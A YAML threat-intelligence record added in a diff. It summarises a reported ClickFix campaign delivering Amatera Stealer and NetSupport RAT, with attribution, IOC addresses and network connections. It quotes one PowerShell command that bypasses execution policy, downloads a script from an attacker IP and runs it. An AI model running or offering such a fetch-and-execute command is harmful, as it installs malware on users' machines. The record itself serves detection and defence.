@@ -1,0 +1,38 @@
+description: "The report describes a state\u2011sponsored threat actor using ClickFix\
+  \ as an initial access vector to deploy Amatera Stealer and NetSupport RAT, with\
+  \ detailed analysis of the Amatera malware\u2019s PowerShell stages, C2 communication,\
+  \ and file activity."
+attribution: SheldIO (state-sponsored)
+malware_families:
+- Amatera Stealer
+- NetSupport Manager RAT
+- Amatera
+TTPs:
+  processes:
+  - powershell.exe
+  commandline:
+  - powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('hxxp://87.120.219.26/P9m4H7S2FqDTof')"
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: powershell.exe
+    destination: 87.120.219.26
+    port: 80
+  - process: powershell.exe
+    destination: 91.98.229.246
+    port: 80
+  - process: powershell.exe
+    destination: 45.94.47.224
+    port: 80
+  file_activity: []
+  persistence: []
+  process_relations: []
+IOCs:
+- 87.120.219.26
+- 91.98.229.246
+- 45.94.47.224
+reference: https://www.esentire.com/blog/evalusion-campaign-delivers-amatera-stealer-and-netsupport-rat
+date_of_publication: November 17, 2025
+file_creation_date: November 17, 2025
